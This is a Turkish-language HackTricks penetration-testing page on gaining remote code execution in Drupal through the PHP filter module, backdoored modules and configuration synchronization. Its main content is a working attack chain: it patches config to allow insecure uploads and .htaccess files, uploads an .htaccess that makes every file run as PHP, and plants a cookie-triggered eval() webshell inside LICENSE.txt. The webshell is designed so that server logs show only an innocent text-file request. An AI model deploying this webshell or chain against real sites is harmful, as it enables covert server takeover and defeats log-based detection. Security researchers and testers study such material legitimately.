# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## PHP Filtre Modülü ile

> [!WARNING]
> Eski Drupal sürümlerinde **(sürüm 8'den önce)**, bir admin olarak giriş yapmak ve **`PHP filter` modülünü etkinleştirmek** mümkündü; bu modül "Gömülü PHP kodu/parçalarının değerlendirilmesine izin verir." Ancak sürüm 8'den itibaren bu modül varsayılan olarak yüklenmemiştir.

1. **/modules/php** adresine gidin ve eğer 403 hatası alıyorsanız, **PHP filter eklentisi yüklenmiştir ve devam edebilirsiniz**
1. Değilse, `Modüller` bölümüne gidin ve `PHP Filter` kutusunu işaretleyin, ardından `Yapılandırmayı kaydet` butonuna tıklayın
2. Sonra, bunu istismar etmek için `İçerik ekle` butonuna tıklayın, ardından `Temel Sayfa` veya `Makale` seçin ve **PHP backdoor** yazın, ardından Metin formatında `PHP` kodunu seçin ve son olarak `Önizleme` seçin
3. Bunu tetiklemek için, yeni oluşturulan düğüme erişin:
```bash
curl http://drupal.local/node/3
```
## PHP Filtre Modülünü Kurun

> [!WARNING]
> Mevcut sürümlerde, varsayılan kurulumdan sonra yalnızca web erişimine sahip olarak eklentileri kurmak artık mümkün değildir.

**8 ve sonrası sürümlerde,** [**PHP Filtre**](https://www.drupal.org/project/php/releases/8.x-1.1) **modülü varsayılan olarak kurulmamıştır**. Bu işlevselliği kullanmak için **modülü kendimiz kurmamız gerekecek**.

1. Modülün en son sürümünü Drupal web sitesinden indirin.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. İndirdikten sonra **`Yönetim`** > **`Raporlar`** > **`Mevcut güncellemeler`** bölümüne gidin.
3. **`Gözat`** butonuna tıklayın, dosyayı indirdiğimiz dizinden seçin ve ardından **`Kur`** butonuna tıklayın.
4. Modül kurulduktan sonra, **`İçerik`** sekmesine tıklayıp **yeni bir temel sayfa oluşturabiliriz**, Drupal 7 örneğinde yaptığımız gibi. Yine, **`Metin formatı`** açılır menüsünden **`PHP kodu`** seçmeyi unutmayın.

## Arka Kapılı Modül

> [!WARNING]
> Mevcut sürümlerde, varsayılan kurulumdan sonra yalnızca web erişimine sahip olarak eklentileri kurmak artık mümkün değildir.

Bir **modülü indirmek**, ona bir **arka kapı** eklemek ve **kurmak** mümkündü. Örneğin, [**Trurnstile**](https://www.drupal.org/project/turnstile) modülünü sıkıştırılmış formatta indirip, içinde yeni bir PHP arka kapı dosyası oluşturarak, `.htaccess` dosyası ile PHP dosyasına erişimi sağlamak:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
Ve ardından **`http://drupal.local/admin/modules/install`** adresine giderek arka kapılı modülü yükleyip **`/modules/turnstile/back.php`** adresine erişerek çalıştırıyoruz.

## Drupal'ı Konfigürasyon Senkronizasyonu ile Arka Kapı Açma <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Gönderi paylaşan** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Bölüm 1 (_Media_ ve _Media Library_'nin etkinleştirilmesi)

_Extend_ menüsünde (/admin/modules), zaten yüklenmiş gibi görünen eklentileri etkinleştirebilirsiniz. Varsayılan olarak, _Media_ ve _Media Library_ eklentileri etkin görünmüyor, bu yüzden bunları etkinleştirelim.

Etkinleştirmeden önce:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Etkinleştirdikten sonra:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bölüm 2 (_Configuration synchronization_ özelliğinden yararlanma) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Drupal konfigürasyon girişlerini dökme (ihracat) ve yükleme (ithalat) için _Configuration synchronization_ özelliğinden yararlanacağız:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

İlk giriş `allow_insecure_uploads`'ı yamanlamaya başlayalım:

Dosya: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Şuna:

Dosya: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Yaman alan.field.media.document.field_media_document.yml**

Ardından, ikinci girişi `file_extensions` olarak yaman: 

Dosya: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Şuna:

Dosya: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Bu blog yazısında kullanmıyorum ama `file_directory` girişinin keyfi bir şekilde tanımlanabileceği ve bir yol geçişi saldırısına karşı savunmasız olduğu not edilmiştir (bu nedenle Drupal dosya sistemi ağacında yukarı geri gidebiliriz).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bölüm 3 (özellik _Belge Ekle_ kullanma) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Son adım en basit olanıdır ve iki alt adıma ayrılmıştır. İlk adım, Apache direktiflerini kullanmak ve .txt dosyalarının PHP motoru tarafından yorumlanmasına izin vermek için bir .htaccess formatında dosya yüklemektir. İkinci adım, payload'ımızı içeren bir .txt dosyası yüklemektir.

Dosya: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Bu hile neden havalı?

Çünkü Webshell (biz buna LICENSE.txt diyeceğiz) Web sunucusuna yüklendikten sonra, komutlarımızı `$_COOKIE` aracılığıyla iletebiliriz ve bu, Web sunucusu günlüklerinde bir metin dosyasına yapılan meşru bir GET isteği olarak görünecektir.

Webshell'imize neden LICENSE.txt adını veriyoruz?

Basitçe, örneğin [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) dosyasını alırsak (ki bu dosya Drupal çekirdeğinde zaten mevcut), 339 satır ve 17.6 KB boyutunda bir dosyamız var, bu da ortasına küçük bir PHP kodu eklemek için mükemmel (çünkü dosya yeterince büyük). 

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dosya: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Bölüm 3.1 (dosya yükle .htaccess)**

Öncelikle, Apache direktiflerini içeren dosyamızı yüklemek için _Add Document_ (/media/add/document) özelliğini kullanıyoruz (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Bölüm 3.2 (dosya yükle LICENSE.txt)**

Daha sonra, bir lisans dosyası içinde gizlenmiş bir Webshell yüklemek için tekrar _Add Document_ (/media/add/document) özelliğini kullanıyoruz.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Bölüm 4 (Webshell ile etkileşim) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Son bölüm, Webshell ile etkileşimde bulunmaktan oluşmaktadır.

Aşağıdaki ekran görüntüsünde gösterildiği gibi, Webshell'imiz tarafından beklenen çerez tanımlı değilse, bir Web tarayıcısı aracılığıyla dosyayı sorguladığımızda aşağıdaki sonucu alırız.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Saldırgan çerezi ayarladığında, Webshell ile etkileşimde bulunabilir ve istediği komutları çalıştırabilir.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Ve loglarda görebileceğiniz gibi, yalnızca bir txt dosyasının talep edildiği görünmektedir.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Bu makaleyi okumak için zaman ayırdığınız için teşekkür ederim, umarım size bazı shell'ler elde etmenizde yardımcı olur. 

{{#include ../../../banners/hacktricks-training.md}}
